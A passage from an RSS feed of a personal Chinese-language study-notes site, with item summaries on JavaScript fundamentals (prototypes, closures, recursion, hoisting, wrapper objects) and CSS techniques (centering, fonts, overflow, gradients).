n = &amp;#39;老虎&amp;#39;; switch (n) { 	// 将表达式 n 与下面的 case 后的子表达式匹配，匹配成功后会执行与其关联的代码块， 	// 且会执行该代码块之后的的所有代码块，为了减少代码请求， 	// 可以使用 break 语句终止执行该代码块之后代码块。 	case &amp;#39;老虎&amp;#39;: 	case &amp;#39;虎&amp;#39;: 	case &amp;#39;白虎&amp;#39;: 	case &amp;#39;母老虎&amp;#39;: 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 包装类</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%8C%85%E8%A3%85%E7%B1%BB/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%8C%85%E8%A3%85%E7%B1%BB/</guid>
      <description>包装类 在 JavaScript 中，因为原始值不能有属性和方法，所以当给原始值添加属性与方法时，系统会自动且隐式的将原始类型的数据转换为对象，然后再调用这个对象的属性和方法，调用完以后，在将其转换为原始值，这个过程叫做包装类。
因为 undefined 与 null 不能有属性，所以它们不能进行包装类。
Number 将原始类型的数值，转换为 Number 对象，它的原型是 Number.prototyp。
数字类型的对象可以进行学运算，但运算的结果，这个对象会变回原始类型的数值。
String 将原始类型的字符串，转换为 String 对象，它的原型是 String.prototyp。
当原始值字符串直接调用属性 length 时，系统会对这个原始值字符串进行包装类，使之变为对象字符串，又因为字符串对象自带属性 length，因此系统不会将这个属性 delete 删掉，所以最终将属性 length 的值返回。
Boolean 将原始类型的布尔值，转换为 boolean 对象，它的原型是 Boolean.prototyp。
注意 因为 Number、String、boolean 它们本身重写了（用一个同名不同功能的方法覆盖系统自带的方法）一个 xxx.prototype.toString 方法，所以它们不会用原型上 Object.prototype 的 toString 方法。
var a = new Number(123); var b = new String(&amp;#39;yxz&amp;#39;); var c = new Boolean(&amp;#39;true&amp;#39;); console.log(typeof a); console.log(typeof b); console.log(typeof c); // 返回三个 object 数值包装类运算 var num = new Number(123); //原始值 num 被进行包装类，因此它变成了 对象 123。 console.</description>
    </item>
    
    <item>
      <title>JavaScript 区分对象与数组</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%8C%BA%E5%88%86%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%8C%BA%E5%88%86%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%95%B0%E7%BB%84/</guid>
      <description>区分对象与数组 Constructor var arr = []; var obj = {}; var a = arr.constructor; console.log(a); // 返回数组。 var b = obj.constructor; console.log(b); // 返回对象。 Instanceof var arr = [];  var obj = {};  var a = arr instanceof Array; console.log(a); // 返回 true，因为变量 arr 是一个数组。 var a = arr instanceof Object; console.log(a); // 返回 true，因为变量 arr 是一个数组类对象。 var b = obj instanceof Array; console.log(b); // 返回 flase，因为变量 obj 不是一个数组。 var b = obj instanceof Object; console.</description>
    </item>
    
    <item>
      <title>JavaScript 原型</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B/</guid>
      <description>原型 原型对象（prototype），它是只有函数才拥有的隐式属性（使用 null 作为构造函数的原型的情况下，原型不能通过自定义进行添加）；通过原型这种机制，JavaScript 中的对象可以从其他的对象那里继承一些功能。
__proto__  每一个对象都有一个属性 proto，这个属性指向该对象的原型对象。 该属性 proto 的指向（值）可以修改，即一个用构造函数创建出的对象实例的原型是可以通过该属性修改的。 当调用一个对象的属性时，如果这个对象没有这个属性，那么就会到构造该对象的构造函数的原型所指向的对象（可以称之为父对象）中去寻找这个属性，如果父对象也没有这个属性，则到该父对象的构造函数的原型所指向的对象（可以称之为为爷爷对象）里去寻找这个属性，如果还没找到，则继续往上找…，直到原型链终端为 Object.prototype；Object.prototype 中有一个 null，相当于到 null 中去取值，即调用一个对象所没有的值，会返回 undefined；这种通过属性 proto 连接原型对象直到 Object.prototype（null）的一条链为原型链。 通常情况，大部分对象最终都会继承自 Object.prototype，因为 Object.create() 方法中可以将 null 放进去当做原型。 在 JavaScript 中，null 与 undefined 没有原型且不是对象。  作用 可以让一个构造函数所创建的多个对象都可以使用公用的属性和方法。
声明一个构造函数之后，该构造函数中会有一个属性 prototype，这个属性指向的就是该构造函数对应的原型对象。
原型对象中有一个属性 constructor，该属性用于指向这个对象的构造函数。
// Demo.prototype = {} 是构造函数 Demo 的原型，它默认是一个空对象（原型对象） // 当构造函数 Demo 被定义完成时，同时该函的原型对象 Demo.prototype = {} 也被定义完成； // Demo.prototype.name = &amp;#34;原型的名字&amp;#34;; // Demo.prototype.size = &amp;#34;500&amp;#34;; // Demo.prototype.height = &amp;#34;1400&amp;#34;; // Demo.prototype.width = &amp;#34;800&amp;#34;; //上面代码可以简化为： Demo.</description>
    </item>
    
    <item>
      <title>JavaScript 原型链</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B%E9%93%BE/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B%E9%93%BE/</guid>
      <description>原型链 每个实例对象（ object ）都有一个私有属性（ proto ），用于指向它的构造函数的原型对象（prototype）；该原型对象也有一个自己的私有属性（proto ），层层向上直到原型对象 Object.prototype 为 null；而 null 没有原型，它作为这个原型链的终端，它的值为 undefined。
几乎所有 JavaScript 中的对象都是位于原型链顶端的 Object 的实例。
可以使用对象的属性 proto 实现继承。</description>
    </item>
    
    <item>
      <title>JavaScript 原始值和引用值</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%8E%9F%E5%A7%8B%E5%80%BC%E5%92%8C%E5%BC%95%E7%94%A8%E5%80%BC/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%8E%9F%E5%A7%8B%E5%80%BC%E5%92%8C%E5%BC%95%E7%94%A8%E5%80%BC/</guid>
      <description>原始值和引用值 在 ECMAScript 中，变量有两种类型的值，即原始值和引用值。
原始值 一种非对象也没有方法和属性的数据类型，也叫基本类型（基本数值或基本数据类型）。所有的原始值都是不可改变的。
Number 数值，用整数或浮点数表示，它允许任意位的小数。
String 字符串，由零个或多个字符构成，它必须被包含在双引号或双引号内。
与数组一样的是，字符串中的每个字符都有一个下标，这些下标从 0 开始。因此，它有属性 length。
Boolean 布尔，表示一个逻辑值，只有 true 或 false 两个值。
BigInt 任何精度格式的整数，是一种比 Number 数据类型支持的范围更大的整数值。用于安全地存储和操作大整数。
Symbol 符号，它是唯一的并且是不可修改的。
undefined 未定义，它只有一个值 undefined，指一个声明未描述的变量的初始值或一个变量直接赋值为 undefined，或没有实际参数的形式参数
Null 空指针，它也只有一个值 null，表示一个不存在的或无效 object 和地址引用。因为历史遗留性问题，它是的数据类型为 Object。
原始值的储存原理 a = 10; // 在栈内存第一层创建一个变量 a ，然后将数值 10 放进变量 a 中。 // 栈内存： // a ： 10 var b = a; // 在栈内存第二层创建一个变量 b，然后将变量 a 中的数值 10 拷贝到变量 b 中。 // 栈内存： // a ：10 // 拷贝变量 10 // b ：10 a = 20; // 在栈内存第三层重新创建一个变量 a，然后将数值 10 放入这个第三层的变量 a 中，之后关闭在第一层的变量 a。 // 栈内存： // a ：10（已关闭） // b ：10 // a ：20 （新的变量 a） 引用值 引用值都是对象，每个对象都有属性和方法。它指的是存储在堆内存中的实际对象。每一个引用变量中都存放着指针，这个指针指向其堆内存中的实际对象。</description>
    </item>
    
    <item>
      <title>JavaScript 命名空间</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</guid>
      <description>命名空间 命名空间（package），它可以帮助我们更好地整理代码，并可避免变量命名冲突。
简单地说，我们可以创建一个简单对象字面量来打包所有的相关函数和变量。这个简单对象字面量模拟了命名空间的作用。
作用 私有化变量 function Demo() { 	var healthy = 0; 	// 该变量为私有化变量，这个变量只能通过构造函数的指定方法进行调用， 	// 不能直接作为对象的属性或变量进行调用。 	this.cure = function () { 	healthy++; 	};  	this.injured = function () { 	healthy--; 	};  	this.view = function () { 	console.log(healthy); 	}; }  var demo = new Demo();  demo.view(); // 返回 0，调用构造函数的属性 view。 demo.cure(); // 调用构造函数的属性 cure。，使变量 healthy 自增 1。 demo.</description>
    </item>
    
    <item>
      <title>JavaScript 属性调用</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%B1%9E%E6%80%A7%E8%B0%83%E7%94%A8/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%B1%9E%E6%80%A7%E8%B0%83%E7%94%A8/</guid>
      <description>属性调用 通常调用属性的格式一般为 fun.arr，实际上系统会隐式将 fun.arr 变为 fun[&amp;ldquo;arr&amp;rdquo;]，因为前者调用更加灵活且简洁。
var demo = { 	wife1: { name: &amp;#39;lei&amp;#39; }, 	wife2: { name: &amp;#39;zheng&amp;#39; }, 	wife3: { name: &amp;#39;xing&amp;#39; }, 	wife4: { name: &amp;#39;zhu&amp;#39; }, 	fun: function (num) { 	var a = [&amp;#39;wife&amp;#39; + num]; 	console.log(a); 	return this[&amp;#39;wife&amp;#39; + num]; 	// 看不太懂 	}, };  demo.fun(1); demo.fun(2); demo.fun(3); demo.fun(4); </description>
    </item>
    
    <item>
      <title>JavaScript 开发原则</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%BC%80%E5%8F%91%E5%8E%9F%E5%88%99/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%BC%80%E5%8F%91%E5%8E%9F%E5%88%99/</guid>
      <description>开发原则 渐进增强 不要使用 JavaScript 代码添加网页的核心内容，应该先保证核心内容脱离与 CSS 与 JavaScript 代码之外。
平稳退化 确保网页在没有 JavaScript 与 CSS 的情况下也能使用核心功能，而且渐进增强的实现必然支持平稳退化。
向后兼容 使用对象检测的方式来检测浏览器对 JavaScript 的支持程度，确保老版本的浏览器不会因为不支持某些 JavaScript 代码而报错。
性能考虑 减少访问 DOM 的和文档中标记的元素；过多的页面元素只会增大 DOM 树的规模。
将多个 JavaScript 文件合并为一个；减少加载页面时发送的请求数量。
压缩已完成的 JavaScript 脚本；将文件中的不必要的字节（空格、注释、回车符）统统删除，从而减少整体文件大小。</description>
    </item>
    
    <item>
      <title>JavaScript 继承方式</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/</guid>
      <description>继承方式 类继承（原型链继承） 缺点 会使一个对象过多继承一些没用或不需要的属性，则会导致代码的执行效率大大降低。反对反对反对法大幅度发反对发的
Grand.prototype.blue = &amp;#39;blue&amp;#39;; function Grand() {}  var grandfather = new Grand();  Father.prototype = grandfather;  function Father() { 	this.red = &amp;#39;red&amp;#39;; 	this.money = { 	card: &amp;#39;pencil&amp;#39;, 	}; 	this.value = &amp;#39;100&amp;#39;; }  var father = new Father();  Son.prototype = father;  function Son() { 	this.orange = &amp;#39;orange&amp;#39;; } var son = new Son();  console.log(son.orange); // 返回 orange。 console.</description>
    </item>
    
    <item>
      <title>JavaScript 节点</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/%E8%8A%82%E7%82%B9/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/%E8%8A%82%E7%82%B9/</guid>
      <description>节点 在文档中，几乎每一样东西都是一个节点（Node），包括空格和换行符都会被解释为节点。
文档的根节点不是 html，而是 document。
分类 元素节点 文档中的元素，nodeType 的值为 1。
属性节点 文档中元素节点的属性，属性节点都被包含在元素节点中。
nodeType 的值为 2。
文本节点 文档中元素所包含的文本。 nodeType 的值为 3。
注释节点 文档中的注释。
nodeType 的值为 8.
document 节点 nodeType 的值为 9。
属性 每一个节点都有四个基本属性。
nodeValue 返回或设置指定点的值。
只用文本节点或注释节点才有 nodeValue。
而其他节点的 nodeValue 是 null 。
nodeName 返回指定节点的大写字母形式的节点名，它是一个只读属性。
nodeType 返回指定节点的类型，只读属性。
元素节点返回 1。
属性节点返回 2。
文本节点返回 3。
注释节点返回 8。
document 节点返回 9。
attributes 返回指定节点的所有属性节点。
方法 hasChildNodes() 判断一个元素是否包含子节点，返回一个布尔值。</description>
    </item>
    
    <item>
      <title>JavaScript 运算符</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%BF%90%E7%AE%97%E7%AC%A6/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%BF%90%E7%AE%97%E7%AC%A6/</guid>
      <description>运算符 算数运算符 算术运算符都会将操作数用 Number() 隐式转换，然后再进行运算；若遇到无法转换的值，则会返回 number 类型的 NaN。
++ a++ 或 ++a，自增（递增）。使操作数加 1，并返回自增后的值。
操作数前置或后置
若位于数值的之后（a++），则会自增之前返回数值。
若位于数值的之前（++a），则会自增之后返回数值。
&amp;ndash; a&amp;ndash; 或 &amp;ndash;a， 递减（自减）。使操作数减 1，并返回自减后的值。
操作数前置或后置
若位于数值的之后（a&amp;ndash;），则会递减之前返回数值。
若位于数值的之前（&amp;ndash;a），则会递减之后返回数值。
比较运算符 JavaScript 有两种比较方式：严格比较和转换类型比较。
对于严格比较运算符（===）来说，仅当两个操作数的类型相同且值相等为 true。
对于比较运算符（==）来说，会先将将两个操作数转换成相同的类型，再进行值的比较运算。
对于关系运算符（ &amp;lt;=）来说，会先将操作数转为原始值，使它们类型相同，再进行值的比较运算。
字符串比较则是使用基于标准字典的 Unicode 值来进行比较的。
原始值比较的是值，引用值比较的是引用地址。
In 用于判断一个对象的指定的属性是否在该对象或其原型链中，在则 in 运算符返回 true，不在则返回 false。
Instanceof 用于判断一个对象是否是由指定构造函数构造出来的。
// 如果 mycar 不是 vue 的实例对象 if (!(mycar instanceof Car)) {  console.log(&amp;#39;No&amp;#39;) } 也可以用于判断一个实例对象的原型链中有没有另一个变量的原型。
function Car(make, model, year) {  this.make = make;  this.</description>
    </item>
    
    <item>
      <title>JavaScript 递归</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/%E9%80%92%E5%BD%92/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/%E9%80%92%E5%BD%92/</guid>
      <description>递归  找规律（符合人的思维过程）。 找出口（用已知的条件当做终止条件，用实际性的数去返回结果），避免无限递归（无限循环），导致浏览器崩溃。 一般格式为 return + 规律公式。 特别复杂的程序一定不能使用递归。  递归的优缺点 优点：使代码更加简洁。
缺点：影响程序的效率与性能。
递归实现阶乘 var n = 5; function OneOne(n) { 	if (n == 1) { 	//将当 n 等于 1 时作为结束条件 	return 1; 	// 返回值为 1 	} 	return (n = n * OneOne(n - 1)); 	// 用公式将阶乘的规律表示出来，因为会无限的循环并且计算，所以需要找到结束条件 	// 使用递归计算 5 的阶乘的过程： 	// OneOne(5); 5 = 5 * (4 * 6);(OneOne(5 - 1)); 	// OneOne(4); 4 = 4 * (2 * 3);(OneOne(4 - 1)); 	// OneOne(3); 3 = 3 * (2 * 1);(OneOne(3 - 1)); 	// OneOne(2); 2 = 2 * (1 * 1);(OneOne(2 - 1)); 	// OneOne(1); 当 n 等于 1 时，直接返回 1; } console.</description>
    </item>
    
    <item>
      <title>JavaScript 链式调用</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8/</guid>
      <description>链式调用 模仿一个 jQuery 链式调用的方式。
var demo = { 	a: function () { 	console.log(123); 	return this; 	// 将函数自身返回。 	},  	b: function () { 	console.log(456); 	return this; 	// 将函数自身返回。 	},  	c: function () { 	console.log(789); 	return this; 	//将函数自身返回。 	}, }; demo.a().b().c(); // 呈链式(连续)的调用对象 demo 的属性。 </description>
    </item>
    
    <item>
      <title>JavaScript 闭包</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E9%97%AD%E5%8C%85/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E9%97%AD%E5%8C%85/</guid>
      <description>闭包 在函数（父函数）中创建另一个函数（子函数）时；当子函数被父函数 return 到了外部时，会生成闭包。
生成了闭包后，虽然父函数的 AO 已经被释放了，但子函数却保存了父函数的 AO，且这个 AO 不会因为父函数的执行完毕而被释放，因为父函数的 AO 已经被子函数给保存了起来，且可以随意调用。
闭包的优缺点 优点 避免全局变量的污染。
使变量长期储存在内存中。
缺点 使用不当会导致原有的作用域链不释放，造成内存泄露（过多占用内存的剩余空间，导致可用空间越来越少）。
function demo() { 	function test() { 	var d = 345; 	console.log(c); 	// 虽然函数 test 中没有变量 c，但因为函数 test 可以使用函数 demo 的 AO， 	// 所以它会到函数 demo 的作用域中去寻找变量 c，然后返回 123 	} 	var c = 123; 	return test; 	// 将函数 test 返回，即将函数 test 与它的作用域一起保存到了外部， 	// 使的函数 demo 可以使用函数 test 的 AO } var e = demo(); // 用变量 e 接收函数 demo 的返回值，也就是接收函数 test 以及它的 AO e(); // 调用变量 e，即相当于执行函数 demo 的返回值 // 父函数 demo 执行完毕后，释放了自己的 AO，但子函数 test 在这之前已经将父函数 demo 的 AO 保存了起来， // 所以它会到函数 demo 的作用域中去寻找变量 c，然后返回 123 function demo() { 	var b = &amp;#39;apple&amp;#39;; 	var obj = { 	c: function () { 	// 给对象 obj 添加一个属性 c ，属性值为一个函数 	if (b !</description>
    </item>
    
    <item>
      <title>JavaScript 预编译</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E9%A2%84%E7%BC%96%E8%AF%91/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E9%A2%84%E7%BC%96%E8%AF%91/</guid>
      <description>预编译 JavaScript 是脚本语言，因此不会进行传统的预编译，但它会经过一个特殊的预编译过程，这个预编译过程发生在代码执行前的极短时间内。
预编译发生在代码执行之前的一瞬间，用于在内存中创建一些空间来存储一些变量与函数；预编译时，会无视 if 语句中的条件，会直接将 if 语句中的代码块内的变量的声明与函数声明进行提升。
函数声明提升 定义一个函数时，该函数会被提升到当前作用域链的顶端，即调用该函数时，不管在哪调用该函数，都可以调用成功；但函数表达式并不会。
变量声明提升 使用 var 声明的变量，不管在这之前还是之后调用该变量，并不会报错，会返回 undefined。
暗示全局变量 暗示全局变量（imply global），一个变量未声明就赋值，那么此变量就是 window（全局对象）的属性； 任何全局变量，都是 window 的属性，即可以通过 window 对象调用全局变量。window 就是全局的域，它包括了全局变量和全局函数。
暗示全局变量不会进行变量声明提升。
a = 10; // 一个变量未声明就赋值，那么此变量就是 window（全局对象）的属性，也叫暗示全局变量 // 相当于 window.a = 10; // 相当于 window = { 	a: 10, };  //一切声明了的全局变量，都是 window 的属性 var b = 20; // 相当于 window.b = 20; // 相当于 window = { 	b: 20, }; // 调用变量 b，相当于调用全局对象 window 的属性 b，即 console.</description>
    </item>
    
    <item>
      <title>Css 实现居中</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%AE%9E%E7%8E%B0%E5%B1%85%E4%B8%AD/</link>
      <pubDate>Sat, 16 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%AE%9E%E7%8E%B0%E5%B1%85%E4%B8%AD/</guid>
      <description>实现居中 绝对定位 兼容性不错的主流 css 绝对定位居中的用法：
width: 600px; height: 400px; position: absolute; left: 50%; top: 50%; margin-top: -200px; /* 高度的一半 */ margin-left: -300px; /* 宽度的一半 */ 绝对定位 transform 中 translate 偏移的百分比值是相对于自身大小的，可以这样实现 css 绝对定位居中，给子元素应用以下样式，将子元素居于父元素正中间，注意：这个方法有 bug。
position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); 弹性布局 给父元素应用以下样式，将子元素居于父元素正中间。
display: flex; flex-direction: row; justify-content: center; align-items: center; display: flex; flex-direction: column; justify-content: center; align-items: center; 文本实现垂直居中 display: flex; align-items: center; </description>
    </item>
    
    <item>
      <title>Css 盒子类型</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E7%9B%92%E5%AD%90%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Sat, 16 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E7%9B%92%E5%AD%90%E7%B1%BB%E5%9E%8B/</guid>
      <description>盒子类型 行盒   display 属性为 inline 的元素是行盒，也叫行级元素；如 span、strong、button、em、a、img、video、audio。
  文字一定是行盒（文字会产生匿名行盒将其包裹）。
  内部产生参考线：一个元素中包含行盒，通常会给行盒设置 vertical-align:baseline，这会导致两个元素的参考线对齐。
  同一个包含块中，连续多个行盒水平依次排列，剩余空间排列不下，才会换行。
  行盒不能包含块盒（a 元素除外）。
  设置 width 和 height 无效；调整行盒的 width 与 height 应使用字体大小、行高、字体类型等间接调整。
  产生空白合并：代码中的连续空白字符，在页面显示时，会被合并为一个空格。
  设置内外边距及边框，水平方向有效，垂直方向只会影响元素的背景，不会影响其他盒子。
  内部包含行块盒或可替换元素，行盒的高度只和文字内容的字体大小有关系，和行块盒或可替换元素无关。
  块盒  display 属性为 block 的元素，也叫块级元素；如 div、h1~h6、pre、ul、li、p。 同一个包含块中，每个块盒独占一行。 p 元素不能包含 div 元素。  行块盒  display 属性为 inline-block 的元素，也叫行块级元素；没有默认值为 inline-block 的元素。 同一个包含块中，连续的多个行块盒水平依次排列。 行块盒内部一定会产生参考线。 产生空白合并  </description>
    </item>
    
    <item>
      <title>Css 高斯模糊</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E9%AB%98%E6%96%AF%E6%A8%A1%E7%B3%8A/</link>
      <pubDate>Sat, 16 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E9%AB%98%E6%96%AF%E6%A8%A1%E7%B3%8A/</guid>
      <description>高斯模糊 backdrop-filter: blur(0.5rem); </description>
    </item>
    
    <item>
      <title>Css 字体</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%AD%97%E4%BD%93/</link>
      <pubDate>Thu, 14 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%AD%97%E4%BD%93/</guid>
      <description>字体 参考线 当制作文字时，会出现几根参考线。不同的文字类型，参考线位置、距离都不一样，同一种文字类型，参考线一致。
组成
 text_top ascent，顶线 super，上基线 baseline，基线 sub，下基线 text_bottom descent，底线  决定因素
 font-family：定义参考线的相对距离。 font-size：定义参考线之间的距离。 line-height：定义参考线的顶部空隙与底部空隙。  元素的基线 img：基线位置位于 img 的下外边距的最底边。
from：基线位于其内容的底边。
行块盒：父元素内部包含行块盒（高度自适应） ，会因为行块盒最后一行有 line-box，则会导致行块盒用最后一行的基线作为整个父元素的基线。若父元素中没有行盒，则使用父元素的下外边距作为基线。
font-size 用该属性设置字体大小时，改变的是文字的相对大小，也叫字体框大小。
制作文字时，文字外面会有一个字体框，不同的文字的字体框，大小也不一样；即设置文字的小大，本质改变的是文字的相对大小。
相对大小
若一个文字的相对大小（字体框大小）为 2048 时，那么它顶线到基线的距离为 1884，底线到基线的距离为 514，则顶线到底线的距离为 1884 + 514 = 2398。（可以拙见为一个字体的高为 2048，那么该字体占的实际区域是 2390，因此某些字体会有默认边距）
文字顶线到底线的距离，叫做文字的实际大小（content-area），也叫内容区。即行盒的背景，填充的是文字的实际大小。因此当我们给行盒设置背景时，会导致行盒上下有留白。即上部分留白 + 行盒背景 + 下部分留白 = 文字的相对大小。
line-height 用于设置多行元素的空间量。
top：文字顶线向上延申的空间。
bottom：文字底线向下延申的空间。
空隙  这两个空间（top 与 bottom）的空间量一定相等，这两个空间叫做空隙（line gap）。 通常，空隙是字体设计者决定的，因此有些字体没有空隙，但有的字体有空隙，有的字体空隙是负数。  虚拟区  top 到 botoom 的距离，叫做虚拟区（virtual-area），有的虚拟区和内容区相等，有的虚拟区比内容区小，但大部分虚拟区都比内容区大；因此设置行高大小就等于设置虚假区的大小。 因为虚拟区上下两边都相等，所以字体的实际大小在虚拟区之间。  line-box  line-box（行框）是承载文字内容的必要条件，如果没有行框，文字将无法显示。 当有多行行盒排列时，每一行的区域就叫做 line-box，line-box 的顶边是该行所有行盒的最顶边，底边是该行行盒的最低底边。即一个行盒的实际占用高度是通过 line-box 计算的。  不生成 line-box 的情况</description>
    </item>
    
    <item>
      <title>Css 文本溢出处理</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E5%A4%84%E7%90%86/</link>
      <pubDate>Wed, 13 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E5%A4%84%E7%90%86/</guid>
      <description>文本溢出处理 实现单行文本的溢出显示省略号可以直接用 text-overflow:ellipsis 属性来实现，当然还需要加宽度width属来兼容部分浏览。
overflow: hidden; text-overflow: ellipsis; white-space: nowrap; </description>
    </item>
    
    <item>
      <title>Css 渐变</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E6%B8%90%E5%8F%98/</link>
      <pubDate>Tue, 12 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E6%B8%90%E5%8F%98/</guid>
      <description>渐变 background-image: linear-gradient(rgb(48, 47, 47), rgb(177, 177, 175)); </description>
    </item>
    
    <item>
      <title>Css 自适应布局</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E8%87%AA%E9%80%82%E5%BA%94%E5%B8%83%E5%B1%80/</link>
      <pubDate>Tue, 12 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E8%87%AA%E9%80%82%E5%BA%94%E5%B8%83%E5%B1%80/</guid>
      <description>自适应布局 @media screen and (min-width: 720px) { 	/* 当浏览器宽度大于 value 时所应用的样式 */ }  @media screen and (max-width: value) { 	/* 当浏览器宽度小于 value 时所应用的样式*/ } </description>
    </item>
    
    <item>
      <title>Css table 空隙</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/table-%E7%A9%BA%E9%9A%99/</link>
      <pubDate>Mon, 11 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/table-%E7%A9%BA%E9%9A%99/</guid>
      <description>table 空隙 如果可能，边框会合并为一个单一的边框。会忽略 border-spacing 和 empty-cells 属性。
border-collapse: collapse; </description>
    </item>
    
    <item>
      <title>Css 修改网页滚动条样式</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E4%BF%AE%E6%94%B9%E7%BD%91%E9%A1%B5%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</link>
      <pubDate>Sun, 10 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E4%BF%AE%E6%94%B9%E7%BD%91%E9%A1%B5%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</guid>
